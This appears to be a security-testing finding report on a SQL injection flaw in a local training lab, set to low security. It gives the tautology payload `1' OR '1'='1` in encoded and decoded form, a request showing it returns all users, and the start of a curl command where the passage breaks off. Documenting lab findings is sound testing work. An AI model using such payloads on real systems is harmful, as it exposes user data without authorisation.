# F01: SQL Injection Vulnerability

## OWASP Category: A03 - Injection

## Target Application
- **URL**: http://localhost:8085/vulnerabilities/sqli/
- **Parameter**: `id` (GET parameter)
- **Security Level**: Low

## Proof of Concept

### Normal Request (User ID = 1)

http://localhost:8085/vulnerabilities/sqli/?id=1&Submit=Submit
text

**Response**: Shows only user "admin"

### Malicious Request

http://localhost:8085/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=Submit
text

**Decoded Payload**: `id=1' OR '1'='1`

**Response**: Shows ALL users in the database

## Evidence

### cURL Command
```bash
curl -X GET "http://localhost:8085/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=Submit" \
